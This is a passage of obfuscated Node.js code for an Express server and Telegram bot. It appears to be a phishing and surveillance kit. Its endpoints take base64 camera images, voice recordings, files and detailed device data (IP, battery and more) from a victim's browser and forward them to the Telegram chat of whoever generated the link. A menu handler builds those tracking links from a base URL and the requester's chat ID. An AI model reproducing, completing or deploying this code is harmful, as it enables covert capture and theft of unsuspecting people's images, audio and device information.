        console[_0x129e74(0x4c4)](_0x125c79[_0x129e74(0x435)], _0x1b41d7), _0xcb5c61[_0x129e74(0x198)](-0x89c + -0x1b23 + -0x25b3 * -0x1)[_0x129e74(0x535)](_0x125c79[_0x129e74(0x3ac)]);
    }
}), app[_0x1155f9(0x45b)](_0x1155f9(0x5c5), (_0x1c4602, _0x34bb20) => {
    const _0x2c43b4 = _0x1155f9, _0x48129e = { 'veLmT': _0x2c43b4(0x439) };
    _0x34bb20[_0x2c43b4(0x13a)](path[_0x2c43b4(0x33d)](__dirname, _0x48129e[_0x2c43b4(0x16d)]));
});
let userRequests = {};
app[_0x1155f9(0x69f)](_0x1155f9(0x672) + _0x1155f9(0x1ee), (_0x3212e8, _0x2358e6) => {
    const _0x4989cd = _0x1155f9, _0x583c69 = { 'xLmwQ': _0x4989cd(0x10e) }, _0x36d268 = _0x3212e8[_0x4989cd(0x496)][_0x4989cd(0x35d)], _0x3b2bfa = _0x3212e8[_0x4989cd(0x496)][_0x4989cd(0x5c8)], _0x92f88a = _0x3212e8[_0x4989cd(0x496)][_0x4989cd(0x566)];
    bot[_0x4989cd(0x171) + 'on'](_0x36d268, _0x3b2bfa, _0x92f88a), _0x2358e6[_0x4989cd(0x535)](_0x583c69[_0x4989cd(0x59e)]);
}), app[_0x1155f9(0x69f)](_0x1155f9(0x635) + _0x1155f9(0x1f5), (_0x40b9e2, _0x43c3f8) => {
    const _0x53ef44 = _0x1155f9, _0x21f2aa = {
            'ILoKB': _0x53ef44(0x363),
            'SZvNT': function (_0x4ebcfe, _0x3a4b0f) {
                return _0x4ebcfe + _0x3a4b0f;
            },
            'GkGLz': _0x53ef44(0x1f9) + _0x53ef44(0x210),
            'VTMXP': _0x53ef44(0x2cb) + ':\x20',
            'Vvndh': function (_0x5026cc, _0xfe2598) {
                return _0x5026cc > _0xfe2598;
            }
        }, _0x8f4c3 = _0x40b9e2[_0x53ef44(0x496)][_0x53ef44(0x35d)], _0x5d276d = _0x40b9e2[_0x53ef44(0x496)][_0x53ef44(0x34e)][_0x53ef44(0xc1)](',');
    console[_0x53ef44(0x3c6)](_0x21f2aa[_0x53ef44(0x1b2)], _0x5d276d[_0x53ef44(0x475)], _0x21f2aa[_0x53ef44(0x668)], _0x8f4c3);
    if (_0x21f2aa[_0x53ef44(0x5d9)](_0x5d276d[_0x53ef44(0x475)], -0x24f2 + 0x3 * -0x625 + 0x3761)) {
        const _0x10405b = _0x5d276d[_0x53ef44(0x43b)]((_0x2aa2bd, _0x2f2823) => {
            const _0x42ce34 = _0x53ef44, _0x5559db = Buffer[_0x42ce34(0x112)](_0x2aa2bd, _0x21f2aa[_0x42ce34(0x3ad)]);
            return bot[_0x42ce34(0x49f)](_0x8f4c3, _0x5559db, { 'caption': _0x42ce34(0x605) + _0x21f2aa[_0x42ce34(0x2c5)](_0x2f2823, -0x2ce + 0xb89 * 0x3 + -0x1fcc) });
        });
        Promise[_0x53ef44(0x56a)](_0x10405b)[_0x53ef44(0x23e)](() => {
            const _0x11e4da = _0x53ef44;
            console[_0x11e4da(0x3c6)](''), _0x43c3f8[_0x11e4da(0xe4)]({ 'success': !![] });
        })[_0x53ef44(0x6e7)](_0xfbadc5 => {
            const _0x162ff2 = _0x53ef44;
            console[_0x162ff2(0x4c4)]('', _0xfbadc5), _0x43c3f8[_0x162ff2(0x198)](0x3d * -0x29 + 0xa6e + -0x1 * -0x14b)[_0x162ff2(0xe4)]({ 'error': '' });
        });
    } else
        console[_0x53ef44(0x3c6)](''), _0x43c3f8[_0x53ef44(0x198)](-0x11c6 + -0x1565 * 0x1 + 0x28bb)[_0x53ef44(0xe4)]({ 'error': '' });
}), app[_0x1155f9(0x69f)](_0x1155f9(0x68b) + _0x1155f9(0x599), upload[_0x1155f9(0x35e)](_0x1155f9(0x175), -0x836 + -0x1172 + 0x19bc), (_0x576700, _0x2bec77) => {
    const _0x3d40bd = _0x1155f9, _0x367fb0 = {
            'hbXdF': function (_0x351a07, _0x9f1c2c) {
                return _0x351a07 > _0x9f1c2c;
            }
        }, _0x534c60 = _0x576700[_0x3d40bd(0x496)][_0x3d40bd(0x56f)], _0x48904f = _0x576700[_0x3d40bd(0x4f0)];
    if (_0x48904f && _0x367fb0[_0x3d40bd(0x1eb)](_0x48904f[_0x3d40bd(0x475)], -0x15a + -0xebd + 0x1017)) {
        console[_0x3d40bd(0x3c6)](_0x3d40bd(0x120) + _0x48904f[_0x3d40bd(0x475)] + '\x20\x20' + _0x534c60);
        const _0x2838d4 = _0x48904f[_0x3d40bd(0x43b)](_0x31f479 => bot[_0x3d40bd(0x49f)](_0x534c60, _0x31f479[_0x3d40bd(0x62c)]));
        Promise[_0x3d40bd(0x56a)](_0x2838d4)[_0x3d40bd(0x23e)](() => {
            const _0x524cce = _0x3d40bd;
            console[_0x524cce(0x3c6)](''), _0x2bec77[_0x524cce(0xe4)]({ 'success': !![] });
        })[_0x3d40bd(0x6e7)](_0x487826 => {
            const _0x113da0 = _0x3d40bd;
            console[_0x113da0(0x4c4)](':', _0x487826), _0x2bec77[_0x113da0(0x198)](0x17e * -0x9 + -0x184 + 0x7 * 0x26a)[_0x113da0(0xe4)]({ 'error': '' });
        });
    } else
        console[_0x3d40bd(0x3c6)](''), _0x2bec77[_0x3d40bd(0x198)](0x2 * 0x57a + -0xfb2 * 0x1 + -0x2 * -0x327)[_0x3d40bd(0xe4)]({ 'error': '' });
}), app[_0x1155f9(0x69f)](_0x1155f9(0x3b0) + 'ce', uploadVoice[_0x1155f9(0x18a)](_0x1155f9(0x2cc)), (_0x172f3f, _0x25c479) => {
    const _0x4a917c = _0x1155f9, _0x8a488f = { 'riXRc': _0x4a917c(0x6b9) }, _0x59a83b = _0x172f3f[_0x4a917c(0x496)][_0x4a917c(0x35d)], _0xb7f202 = _0x172f3f[_0x4a917c(0x240)][_0x4a917c(0x645)];
    bot[_0x4a917c(0x41c)](_0x59a83b, _0xb7f202)[_0x4a917c(0x23e)](() => {
        const _0x2d4e81 = _0x4a917c;
        fs[_0x2d4e81(0x21b)](_0xb7f202), _0x25c479[_0x2d4e81(0x535)]('');
    })[_0x4a917c(0x6e7)](_0x17fe03 => {
        const _0x26bc9c = _0x4a917c;
        console[_0x26bc9c(0x4c4)](_0x17fe03), _0x25c479[_0x26bc9c(0x198)](-0x1f79 + 0x1dba + 0x1 * 0x3b3)[_0x26bc9c(0x535)](_0x8a488f[_0x26bc9c(0x574)]);
    });
});
const PORT = process[_0x1155f9(0x5c3)][_0x1155f9(0x36d)] || 0x1596 + 0x63d * 0x1 + 0x13 * -0xd9;
app[_0x1155f9(0x4bb)](PORT, () => {
    const _0x87c83d = _0x1155f9;
    console[_0x87c83d(0x3c6)](_0x87c83d(0x419) + _0x87c83d(0x415) + _0x87c83d(0x220) + PORT);
}), app[_0x1155f9(0x45b)](_0x1155f9(0x600), (_0x4ce727, _0x137ced) => {
    const _0x236bdb = _0x1155f9, _0x413285 = { 'jkyWS': _0x236bdb(0x387) };
    _0x137ced[_0x236bdb(0x13a)](path[_0x236bdb(0x33d)](__dirname, _0x413285[_0x236bdb(0x4dd)]));
}), app[_0x1155f9(0x69f)](_0x1155f9(0x30a), async (_0x30c5c7, _0x3b15c0) => {
    const _0xa7aa7f = _0x1155f9, _0x2702a0 = {
            'wCXUF': _0xa7aa7f(0x42c),
            'AoLkk': _0xa7aa7f(0x2fb) + _0xa7aa7f(0x5cc) + _0xa7aa7f(0x3a3),
            'uKpZr': _0xa7aa7f(0x3f6) + _0xa7aa7f(0x1a5) + _0xa7aa7f(0x184),
            'ygQqC': _0xa7aa7f(0x3f6) + _0xa7aa7f(0x1a5) + _0xa7aa7f(0x22d),
            'ujgJj': _0xa7aa7f(0x54f) + _0xa7aa7f(0x3c8) + _0xa7aa7f(0x459)
        }, _0xbb2c34 = _0x30c5c7[_0xa7aa7f(0x496)][_0xa7aa7f(0x56f)], _0x2a6c97 = _0x30c5c7[_0xa7aa7f(0x496)][_0xa7aa7f(0x602)];
    if (_0x2a6c97) {
        const _0x4d1bda = _0xa7aa7f(0x325) + _0xa7aa7f(0x4d1) + _0xa7aa7f(0x510) + _0xa7aa7f(0x571) + _0x2a6c97[_0xa7aa7f(0x385)] + (_0xa7aa7f(0x3a9) + _0xa7aa7f(0x2fc)) + _0x2a6c97[_0xa7aa7f(0x5d3)] + (_0xa7aa7f(0x3d2) + _0xa7aa7f(0x117)) + _0x2a6c97['ip'] + (_0xa7aa7f(0x41f) + _0xa7aa7f(0x1ac)) + _0x2a6c97[_0xa7aa7f(0x5aa)] + (_0xa7aa7f(0x402) + _0xa7aa7f(0x5c6) + _0xa7aa7f(0x138)) + _0x2a6c97[_0xa7aa7f(0x5d6)] + (_0xa7aa7f(0x4ab) + _0xa7aa7f(0x571)) + _0x2a6c97[_0xa7aa7f(0x441)] + _0xa7aa7f(0x3de) + _0x2a6c97[_0xa7aa7f(0x327) + 'ed'] + (_0xa7aa7f(0x275) + _0xa7aa7f(0x23c) + _0xa7aa7f(0x6e9) + _0xa7aa7f(0x193)) + _0x2a6c97[_0xa7aa7f(0x688) + 'e'] + (_0xa7aa7f(0x3f8) + ':\x20') + _0x2a6c97[_0xa7aa7f(0x3a5)] + (_0xa7aa7f(0x2cf) + _0xa7aa7f(0x4fc)) + _0x2a6c97[_0xa7aa7f(0x36a)] + (_0xa7aa7f(0x693) + _0xa7aa7f(0x119)) + _0x2a6c97[_0xa7aa7f(0x675) + _0xa7aa7f(0x567)] + (_0xa7aa7f(0x283) + _0xa7aa7f(0x4fc)) + _0x2a6c97[_0xa7aa7f(0x5f3)] + (_0xa7aa7f(0xe9) + _0xa7aa7f(0x444)) + _0x2a6c97[_0xa7aa7f(0x295)] + (_0xa7aa7f(0x55a) + _0xa7aa7f(0x211) + _0xa7aa7f(0x571)) + _0x2a6c97[_0xa7aa7f(0x18f) + _0xa7aa7f(0x379)] + (_0xa7aa7f(0x454) + _0xa7aa7f(0x1f1) + '\x20') + _0x2a6c97[_0xa7aa7f(0x209)] + (_0xa7aa7f(0x3ff) + _0xa7aa7f(0x3ba)) + _0x2a6c97[_0xa7aa7f(0x28f)] + (_0xa7aa7f(0x52c) + _0xa7aa7f(0x5b8)) + _0x2a6c97[_0xa7aa7f(0x451) + 'e'] + (_0xa7aa7f(0x2a6) + _0xa7aa7f(0x534)) + _0x2a6c97[_0xa7aa7f(0x543) + _0xa7aa7f(0x5ec)] + (_0xa7aa7f(0x300) + _0xa7aa7f(0x208)) + _0x2a6c97[_0xa7aa7f(0xb5) + _0xa7aa7f(0x639)] + (_0xa7aa7f(0x433) + _0xa7aa7f(0x40a) + _0xa7aa7f(0x5c4)) + _0x2a6c97[_0xa7aa7f(0x68d)] + (_0xa7aa7f(0x592) + _0xa7aa7f(0x208)) + _0x2a6c97[_0xa7aa7f(0x50d) + _0xa7aa7f(0x2f5)] + (_0xa7aa7f(0x266) + _0xa7aa7f(0x252)) + _0x2a6c97[_0xa7aa7f(0x2b7)] + (_0xa7aa7f(0x57b) + _0xa7aa7f(0x65f) + _0xa7aa7f(0x281)) + _0x2a6c97[_0xa7aa7f(0x388)] + (_0xa7aa7f(0x514) + _0xa7aa7f(0x4f8) + _0xa7aa7f(0x330) + '\x20') + _0x2a6c97[_0xa7aa7f(0xdd) + _0xa7aa7f(0x356)] + (_0xa7aa7f(0x494) + _0xa7aa7f(0x1bf) + _0xa7aa7f(0x416)) + _0x2a6c97[_0xa7aa7f(0x239) + _0xa7aa7f(0x664)] + (_0xa7aa7f(0x118) + _0xa7aa7f(0x425) + _0xa7aa7f(0x6a9) + _0xa7aa7f(0x4b5)) + _0x2a6c97[_0xa7aa7f(0x4e9) + _0xa7aa7f(0x412)] + (_0xa7aa7f(0x25b) + _0xa7aa7f(0x329) + _0xa7aa7f(0x287)) + _0x2a6c97[_0xa7aa7f(0x11b) + _0xa7aa7f(0x403)] + (_0xa7aa7f(0x529) + _0xa7aa7f(0x656) + _0xa7aa7f(0x1a8)) + _0x2a6c97[_0xa7aa7f(0x4c7) + 'rt'] + (_0xa7aa7f(0x22b) + '\x20');
        try {
            await bot[_0xa7aa7f(0x420) + 'e'](_0xbb2c34, _0x4d1bda, { 'parse_mode': _0x2702a0[_0xa7aa7f(0x5e3)] }), console[_0xa7aa7f(0x3c6)](_0x2702a0[_0xa7aa7f(0x192)]), _0x3b15c0[_0xa7aa7f(0xe4)]({ 'success': !![] });
        } catch (_0x46b103) {
            console[_0xa7aa7f(0x4c4)](_0x2702a0[_0xa7aa7f(0x4de)], _0x46b103), _0x3b15c0[_0xa7aa7f(0x198)](0x1 * -0x2329 + -0x1b14 + 0x1 * 0x4031)[_0xa7aa7f(0xe4)]({ 'error': _0x2702a0[_0xa7aa7f(0x580)] });
        }
    } else
        console[_0xa7aa7f(0x3c6)](_0x2702a0[_0xa7aa7f(0x279)]), _0x3b15c0[_0xa7aa7f(0x198)](-0x2 * -0x296 + -0x13 * -0x16c + 0x1c * -0x118)[_0xa7aa7f(0xe4)]({ 'error': _0x2702a0[_0xa7aa7f(0x279)] });
}), app[_0x1155f9(0x69f)](_0x1155f9(0x34f), (_0x2e7b30, _0x2c006c) => {
    const _0x53bd30 = _0x1155f9, _0x5c0586 = {
            'KGTLS': _0x53bd30(0x363),
            'dwNgt': function (_0x28af32, _0x4000b0) {
                return _0x28af32 + _0x4000b0;
            },
            'OcepQ': _0x53bd30(0x436) + _0x53bd30(0x3fd)
        }, _0x19d20b = _0x2e7b30[_0x53bd30(0x496)][_0x53bd30(0x35d)], _0x126975 = _0x2e7b30[_0x53bd30(0x496)][_0x53bd30(0x34e)][_0x53bd30(0xc1)](',');
    _0x126975[_0x53bd30(0x243)]((_0x1694fc, _0x27b004) => {
        const _0x4edbe4 = _0x53bd30, _0x305122 = Buffer[_0x4edbe4(0x112)](_0x1694fc, _0x5c0586[_0x4edbe4(0x2dd)]);
        bot[_0x4edbe4(0x49f)](_0x19d20b, _0x305122, { 'caption': _0x4edbe4(0x49a) + _0x5c0586[_0x4edbe4(0x62f)](_0x27b004, 0x1 * 0x202d + 0x3 * 0xc17 + -0x4471) });
    }), console[_0x53bd30(0x3c6)](_0x53bd30(0x5b3) + _0x53bd30(0x1c0) + _0x53bd30(0x284) + _0x19d20b), dataStore[_0x19d20b] && dataStore[_0x19d20b][_0x53bd30(0x55b)] ? _0x2c006c[_0x53bd30(0x446)](dataStore[_0x19d20b][_0x53bd30(0x55b)]) : _0x2c006c[_0x53bd30(0x535)](_0x5c0586[_0x53bd30(0x429)]);
}), app[_0x1155f9(0x45b)](_0x1155f9(0x406), (_0x366987, _0x46d789) => {
    const _0x15b289 = _0x1155f9, _0x564aa2 = { 'TPkgq': _0x15b289(0x1af) };
    _0x46d789[_0x15b289(0x13a)](path[_0x15b289(0x33d)](__dirname, _0x564aa2[_0x15b289(0x29e)]));
});
function _0x2f15(_0x40a342, _0x2ee796) {
    const _0x4e7f60 = _0x20bb();
    return _0x2f15 = function (_0x58b4b3, _0xc885f4) {
        _0x58b4b3 = _0x58b4b3 - (-0xad5 + 0x1d6a + -0x11e8 * 0x1);
        let _0x3ea1ad = _0x4e7f60[_0x58b4b3];
        return _0x3ea1ad;
    }, _0x2f15(_0x40a342, _0x2ee796);
}
let linkUsage = {};
const maxAttemptsPerButton = 0x821 * 0x3 + -0x132e + -0x30a * 0x1;
function validateLinkUsage(_0x2b5162, _0xd002cc) {
    const _0x3b3f22 = _0x1155f9, _0x1cd8a6 = {
            'mmnyQ': function (_0x3beba4, _0x45163f) {
                return _0x3beba4(_0x45163f);
            },
            'QohxI': function (_0x1d33e8, _0x5dccaa) {
                return _0x1d33e8 >= _0x5dccaa;
            }
        }, _0x180beb = _0x2b5162 + ':' + _0xd002cc;
    if (_0x1cd8a6[_0x3b3f22(0x2ad)](isVIPUser, _0x2b5162))
        return !![];
    if (linkUsage[_0x180beb] && _0x1cd8a6[_0x3b3f22(0x545)](linkUsage[_0x180beb][_0x3b3f22(0x307)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x180beb] && (linkUsage[_0x180beb] = { 'attempts': 0x0 }), linkUsage[_0x180beb][_0x3b3f22(0x307)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x5acc2e) {
    vipUsers[_0x5acc2e] = !![];
}
function removeVIPUser(_0x25b8be) {
    delete vipUsers[_0x25b8be];
}
function isVIPUser(_0x49f71d) {
    return !!vipUsers[_0x49f71d];
}
bot[_0x1155f9(0x2bb)](/\/start/, async _0x3a2b40 => {
    const _0x11efb3 = _0x1155f9, _0x558e41 = {
            'xvorv': function (_0x1187c1, _0x1b9ef1) {
                return _0x1187c1(_0x1b9ef1);
            },
            'UnnvO': _0x11efb3(0x6d2) + _0x11efb3(0x31c) + _0x11efb3(0x2f0) + _0x11efb3(0x13e) + _0x11efb3(0x289) + _0x11efb3(0x6d5),
            'IdWNl': _0x11efb3(0x244) + _0x11efb3(0x28b) + _0x11efb3(0x106),
            'xYolf': _0x11efb3(0x32c) + _0x11efb3(0x132) + _0x11efb3(0x3bd),
            'YKfkn': _0x11efb3(0x32c) + _0x11efb3(0x46b) + _0x11efb3(0x2dc),
            'VETkM': _0x11efb3(0xc9) + _0x11efb3(0x587),
            'NFufL': _0x11efb3(0x3ee) + _0x11efb3(0x4f7),
            'stFVA': _0x11efb3(0x143) + _0x11efb3(0x5af) + _0x11efb3(0x3bf),
            'ojfEQ': _0x11efb3(0x674) + 's',
            'QBTWn': _0x11efb3(0x548) + _0x11efb3(0x3c5),
            'fLMiq': _0x11efb3(0x485) + _0x11efb3(0xe8),
            'IlAoE': _0x11efb3(0x104) + _0x11efb3(0x1ae),
            'qJxgL': _0x11efb3(0x46d) + _0x11efb3(0x560),
            'elqXL': _0x11efb3(0x2cd) + _0x11efb3(0x5d8),
            'vquoq': _0x11efb3(0x225) + _0x11efb3(0x6a0),
            'Hgaoy': _0x11efb3(0x5d7) + _0x11efb3(0x149),
            'bsSHw': _0x11efb3(0x3b7),
            'MJSmF': _0x11efb3(0x1e8) + _0x11efb3(0x109),
            'lytPq': _0x11efb3(0x354) + 're',
            'qKnsQ': _0x11efb3(0x5f4) + _0x11efb3(0x43c),
            'iOebq': _0x11efb3(0x6de),
            'IvixX': _0x11efb3(0x5eb) + _0x11efb3(0x3d5),
            'WvIzw': _0x11efb3(0x2d8) + _0x11efb3(0x62d) + _0x11efb3(0xff),
            'xYoaD': _0x11efb3(0x2d9) + _0x11efb3(0x54a) + _0x11efb3(0x35a) + _0x11efb3(0x322) + _0x11efb3(0x2b1),
            'dtUgn': _0x11efb3(0x235) + _0x11efb3(0x477),
            'FvecC': _0x11efb3(0x473) + _0x11efb3(0x2b6),
            'BbscU': _0x11efb3(0x123) + _0x11efb3(0x586),
            'UMwvw': _0x11efb3(0x24d) + _0x11efb3(0x305) + _0x11efb3(0x667) + _0x11efb3(0x695) + _0x11efb3(0x40c),
            'eoDqb': _0x11efb3(0x6ca) + _0x11efb3(0x2fa),
            'alSkf': _0x11efb3(0x48b),
            'TRXRR': _0x11efb3(0x5f8) + _0x11efb3(0x355) + _0x11efb3(0x642),
            'vooRh': _0x11efb3(0x417),
            'xovpt': _0x11efb3(0x1f6) + _0x11efb3(0x662),
            'NGtcv': _0x11efb3(0x372) + _0x11efb3(0x12f) + _0x11efb3(0x488) + _0x11efb3(0x4db) + _0x11efb3(0x5c7),
            'RnlxC': _0x11efb3(0x29c) + _0x11efb3(0x5f6),
            'ginFK': _0x11efb3(0x61d) + _0x11efb3(0x498) + '3',
            'vgUSy': _0x11efb3(0x414) + _0x11efb3(0x108),
            'rMOnR': _0x11efb3(0x447) + _0x11efb3(0x157) + _0x11efb3(0x3e4) + _0x11efb3(0x64e) + 'e/',
            'NxaZI': _0x11efb3(0x2c3) + _0x11efb3(0x399),
            'ewFaC': _0x11efb3(0x1cd) + 'il',
            'kAsfy': _0x11efb3(0x6eb) + '💳',
            'lvxuZ': _0x11efb3(0x4ee) + _0x11efb3(0x48a),
            'celRM': _0x11efb3(0x622) + _0x11efb3(0x206),
            'MNEIp': _0x11efb3(0x44d) + _0x11efb3(0x350),
            'CgDcc': _0x11efb3(0x127) + _0x11efb3(0x242),
            'NViFH': _0x11efb3(0x443) + _0x11efb3(0x6d0),
            'SThml': _0x11efb3(0x137) + _0x11efb3(0x53f),
            'xrNcn': _0x11efb3(0x61d) + _0x11efb3(0x1ef),
            'iSIHC': function (_0x15732b, _0x2169b6) {
                return _0x15732b === _0x2169b6;
            },
            'kFsDs': _0x11efb3(0x6d9) + _0x11efb3(0x43a) + _0x11efb3(0x28d) + _0x11efb3(0x6cd),
            'uDFyt': _0x11efb3(0x407) + _0x11efb3(0x20c),
            'ZNYkj': _0x11efb3(0x636),
            'DJSrr': _0x11efb3(0x3cd) + _0x11efb3(0xfc),
            'NYEHS': _0x11efb3(0x413)
        }, _0x3366a3 = _0x3a2b40[_0x11efb3(0x12c)]['id'], _0x5d0527 = await _0x558e41[_0x11efb3(0x302)](isUserSubscribed, _0x3366a3);
    if (!_0x5d0527) {
        const _0x43b4a4 = _0x558e41[_0x11efb3(0x2e1)], _0x4b001b = developerChannels[_0x11efb3(0x43b)](_0x1250b5 => [{
                    'text': _0x11efb3(0x2b0) + _0x1250b5,
                    'url': _0x11efb3(0x61d) + _0x11efb3(0x40c) + _0x1250b5[_0x11efb3(0x1cf)](-0x127 * -0x11 + -0xb71 * 0x3 + 0xebd)
                }]);
        bot[_0x11efb3(0x420) + 'e'](_0x3366a3, _0x43b4a4, { 'reply_markup': { 'inline_keyboard': _0x4b001b } });
        return;
    }
    const _0x38bf50 = _0x558e41[_0x11efb3(0xd0)], _0x309a36 = [
            [
                {
                    'text': _0x558e41[_0x11efb3(0x65d)],
                    'callback_data': _0x11efb3(0xe5) + _0x11efb3(0x4b6) + _0x3366a3
                },
                {
                    'text': _0x558e41[_0x11efb3(0x2d2)],
                    'callback_data': _0x11efb3(0x515) + 'k:' + _0x3366a3
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x2f6)],
                    'callback_data': _0x11efb3(0x525) + 'n:' + _0x3366a3
                },
                {
                    'text': _0x558e41[_0x11efb3(0x214)],
                    'callback_data': _0x11efb3(0x448) + 'e:' + _0x3366a3
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x646)],
                    'callback_data': _0x558e41[_0x11efb3(0x1a3)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x101)],
                    'callback_data': _0x558e41[_0x11efb3(0x492)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0xf3)],
                    'callback_data': _0x558e41[_0x11efb3(0xea)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0xcd)],
                    'callback_data': _0x11efb3(0x19f) + _0x11efb3(0x4b9) + _0x3366a3
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x1d1)],
                    'callback_data': _0x11efb3(0x369) + _0x11efb3(0x2ce) + _0x3366a3
                },
                {
                    'text': _0x558e41[_0x11efb3(0x460)],
                    'callback_data': _0x558e41[_0x11efb3(0x1aa)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x6b6)],
                    'callback_data': _0x558e41[_0x11efb3(0x5e5)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x5d2)],
                    'callback_data': _0x558e41[_0x11efb3(0x2e4)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x1e0)],
                    'callback_data': _0x11efb3(0x63b) + 'k:' + _0x3366a3
                },
                {
                    'text': _0x558e41[_0x11efb3(0x100)],
                    'web_app': { 'url': _0x558e41[_0x11efb3(0xb9)] }
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x60e)],
                    'callback_data': _0x558e41[_0x11efb3(0x52a)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x5f9)],
                    'web_app': { 'url': _0x558e41[_0x11efb3(0x1f7)] }
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x26a)],
                    'callback_data': _0x558e41[_0x11efb3(0x232)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x1ce)],
                    'callback_data': _0x558e41[_0x11efb3(0x288)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x158)],
                    'web_app': { 'url': _0x558e41[_0x11efb3(0x32f)] }
                },
                {
                    'text': _0x558e41[_0x11efb3(0x18e)],
                    'url': _0x558e41[_0x11efb3(0x4d2)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x1fd)],
                    'web_app': { 'url': _0x558e41[_0x11efb3(0x1d2)] }
                },
                {
                    'text': _0x558e41[_0x11efb3(0x200)],
                    'callback_data': _0x558e41[_0x11efb3(0x618)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x2a1)],
                    'callback_data': _0x558e41[_0x11efb3(0xfa)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x511)],
                    'callback_data': _0x558e41[_0x11efb3(0x593)]
                }
            ],
            [
                {
                    'text': _0x558e41[_0x11efb3(0x253)],
                    'callback_data': _0x558e41[_0x11efb3(0x692)]
                },
                {
                    'text': _0x558e41[_0x11efb3(0x2ab)],
                    'url': _0x558e41[_0x11efb3(0x315)]
                }
            ]
        ];
    bot[_0x11efb3(0x420) + 'e'](_0x3366a3, _0x38bf50, { 'reply_markup': { 'inline_keyboard': _0x309a36 } });
    if (_0x558e41[_0x11efb3(0x182)](_0x3366a3, -0x27caa08b8 + 0x3aa6f2ed * -0x2 + -0x4480b1e4c * -0x1)) {
        const _0x2b376f = _0x558e41[_0x11efb3(0x682)], _0x509d33 = [[
                    {
                        'text': _0x558e41[_0x11efb3(0x56c)],
                        'callback_data': _0x558e41[_0x11efb3(0x66e)]
                    },
                    {
                        'text': _0x558e41[_0x11efb3(0x2bd)],
                        'callback_data': _0x558e41[_0x11efb3(0x2a4)]
                    }
                ]];
        bot[_0x11efb3(0x420) + 'e'](_0x3366a3, _0x2b376f, { 'reply_markup': { 'inline_keyboard': _0x509d33 } });
    }
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x597406 => {
    const _0x4c843a = _0x1155f9, _0x2fbb58 = {
            'iWYvF': function (_0x256439, _0x3b02b4) {
                return _0x256439 === _0x3b02b4;
            },
            'FoYvk': _0x4c843a(0x485) + _0x4c843a(0xe8)
        }, _0xb8666f = _0x597406[_0x4c843a(0x641)][_0x4c843a(0x12c)]['id'], _0x3add3f = _0x597406[_0x4c843a(0x628)];
    if (_0x2fbb58[_0x4c843a(0x185)](_0x3add3f, _0x2fbb58[_0x4c843a(0x3cb)])) {
        const _0x57738c = _0x4c843a(0x6ac) + _0x4c843a(0x301) + _0x4c843a(0x2d6) + _0x4c843a(0x341) + _0x4c843a(0x2ea) + _0x4c843a(0x3b4) + baseUrl + (_0x4c843a(0x167) + _0x4c843a(0x54b)) + _0xb8666f;
        bot[_0x4c843a(0x420) + 'e'](_0xb8666f, _0x57738c);
    }
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), async _0x1c2822 => {
    const _0x1a8127 = _0x1155f9, _0x1e5af7 = {
            'CWufH': function (_0x38e724, _0x53aac5) {
                return _0x38e724(_0x53aac5);
            },
            'pUJlR': function (_0x10766d, _0x1e96d3) {
                return _0x10766d(_0x1e96d3);
            },
            'xkoaC': _0x1a8127(0x6de),
            'TRlDB': _0x1a8127(0x674) + 's',
            'qCERc': _0x1a8127(0x354) + 're',
            'YAxlf': _0x1a8127(0x19f) + _0x1a8127(0x317),
            'muLiL': _0x1a8127(0x3b7),
            'ovPcA': _0x1a8127(0x63b) + 'k',
            'ChzUJ': _0x1a8127(0x417),
            'yfeok': _0x1a8127(0x369) + _0x1a8127(0x2bc),
            'hyGny': function (_0xe32b37, _0x33d352) {
                return _0xe32b37(_0x33d352);
            },
            'npQAb': _0x1a8127(0x6d2) + _0x1a8127(0x31c) + _0x1a8127(0x2f0) + _0x1a8127(0x13e) + _0x1a8127(0x289) + _0x1a8127(0x6d5),
            'dQjgi': function (_0x6a3d33, _0x5afc76) {
                return _0x6a3d33 === _0x5afc76;
            },
            'Exlpx': _0x1a8127(0x46d) + _0x1a8127(0x560),
            'BzDii': _0x1a8127(0xd5),
            'iPBca': _0x1a8127(0x23d) + _0x1a8127(0xc8) + _0x1a8127(0x1ad) + _0x1a8127(0x4a7) + _0x1a8127(0xc5) + _0x1a8127(0x56e),
            'fEbgy': _0x1a8127(0x527) + _0x1a8127(0x466) + _0x1a8127(0x5a1) + _0x1a8127(0x383) + 'ns',
            'VEnSD': _0x1a8127(0x26d) + _0x1a8127(0x105),
            'ZDmEU': _0x1a8127(0x4cd),
            'RxpJn': _0x1a8127(0x6db) + _0x1a8127(0x1e9) + _0x1a8127(0x4a6) + _0x1a8127(0x35f) + _0x1a8127(0x6e5) + _0x1a8127(0x2f1) + _0x1a8127(0x421) + _0x1a8127(0x6b4) + _0x1a8127(0x2bf) + _0x1a8127(0x4a4) + 'cA',
            'topre': _0x1a8127(0x44e) + _0x1a8127(0x188),
            'GgPOV': _0x1a8127(0x1fc) + _0x1a8127(0x4bd),
            'asYCj': _0x1a8127(0x103) + _0x1a8127(0x4d3) + _0x1a8127(0x163) + _0x1a8127(0x2fd) + _0x1a8127(0x5b0) + _0x1a8127(0x3f1) + _0x1a8127(0x438),
            'gMaVk': _0x1a8127(0x66a) + _0x1a8127(0x2f3),
